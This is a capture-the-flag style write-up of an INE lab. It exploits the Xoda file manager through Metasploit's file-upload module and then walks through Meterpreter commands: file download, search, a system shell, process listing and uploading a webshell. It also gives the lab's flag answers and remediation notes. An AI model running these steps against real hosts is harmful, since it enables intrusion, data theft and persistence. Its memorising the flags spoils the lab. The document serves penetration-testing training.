---
title: "Meterpreter Basics"
description: "Exploiting the Xoda file manager for a Meterpreter session, then working through the core Meterpreter commands — navigation, file read/write, download/upload, search, checksums, environment and process listing — to collect several flags."
date: 2025-11-14
platform: "INE Labs"
difficulty: "Medium"
tags: ["Meterpreter", "Metasploit", "Xoda", "Post-Exploitation", "File Transfer", "Linux"]
cover: "./photo13.png"
---

# Meterpreter Basics

**Classification:** Host & Network Penetration Testing / The Metasploit Framework<br>
**Target:** demo.ine.local (192.239.82.3) — Ubuntu, Apache 2.4.7 (Xoda), MySQL 5.5<br>

**Flags**
- flag1 (`/app/flag1`): `5c50a439f040922188a22f88cecc5277`
- flag2 (`/app/Secret Files/.flag2`): `bbbb3ed27502614e27bff65faea008a0`

## 1. Executive Summary

The target runs the **Xoda** file manager (arbitrary file upload). After getting a
Meterpreter session we exercise the core Meterpreter command set — remote/local navigation,
reading and editing files, downloading archives, searching by directory/extension, printing
checksums, inspecting `PATH`, listing processes and uploading a webshell — while collecting
the lab's flags.

## 2. Recon & Exploitation

```bash
ping -c 4 demo.ine.local
db_nmap -sV 192.239.82.3
services
```

![Ping target](./photo1.png)

![MSF global variables](./photo2.png)

![Nmap scan](./photo3.png)

![services — Apache (Xoda) + MySQL](./photo4.png)

![Xoda web server on port 80](./photo5.png)

```bash
use exploit/linux/http/xoda_file_upload
set RHOSTS 192.239.82.3
set TARGETURI /
exploit
```

![xoda_file_upload — Meterpreter session](./photo6.png)

## 3. Core Commands

System info and current user.

```bash
sysinfo
getuid
```

![sysinfo](./photo7.png)

![getuid](./photo8.png)

Backgrounding, running a command against a session from outside, and renaming sessions.

```bash
background
sessions -c "sysinfo" -i 1
sessions -n Victim1 -i 1
```

![background](./photo9.png)

![sessions -c ... -i](./photo10.png)

![sessions -n ... -i (rename)](./photo11.png)

Back in the session, the shell-like commands (`pwd`, `ls`, `lpwd`, `lls`, `cd`).

![Meterpreter command set](./photo12.png)

## 4. Flags 1 & 2 — Read & Navigate

```bash
cd /app
cat flag1                 # 5c50a439f040922188a22f88cecc5277
cd "Secret Files"         # quotes for spaces
ls
cat .flag2                # bbbb3ed27502614e27bff65faea008a0
```

![cat flag1 / .flag2](./photo13.png)

## 5. Download, Unzip & Checksum

`download` pulls files to the attacker.

```bash
download flag5.zip
```

![download (1)](./photo14.png)

![download (2)](./photo15.png)

Unzipping `flag5.zip` with the given password, then removing it from the target.

```bash
unzip -P 56784 flag5.zip
rm flag5.zip
```

![Unzipping flag5 (1)](./photo16.png)

![Extracted clue (2)](./photo17.png)

![Removing the zip (3)](./photo18.png)

Printing the checksum of the file named in the extracted clue.

```bash
checksum md5 /bin/bash
```

![MD5 of /bin/bash](./photo19.png)

## 6. Search & PATH

Searching by directory and by extension; the `PATH` holds a file with "ckdo" in its name.

```bash
getenv PATH
search -d /usr/local/bin -f *ckdo*
```

![search -d](./photo20.png)

![search -f (by extension)](./photo21.png)

## 7. Shell, Processes & Upload

```bash
shell            # drop to a system shell (Ctrl+C to return)
```

![shell](./photo22.png)

```bash
ps               # list processes
upload shell.php /app/
```

![ps — process list](./photo23.png)

## 8. Notes & Remediation

1. **Patch/replace Xoda** — arbitrary file upload leads directly to RCE.
2. **Make upload directories non-executable** and validate file types server-side.
3. **Apply least privilege** and monitor for webshell uploads and anomalous `download`/
   `upload` activity.
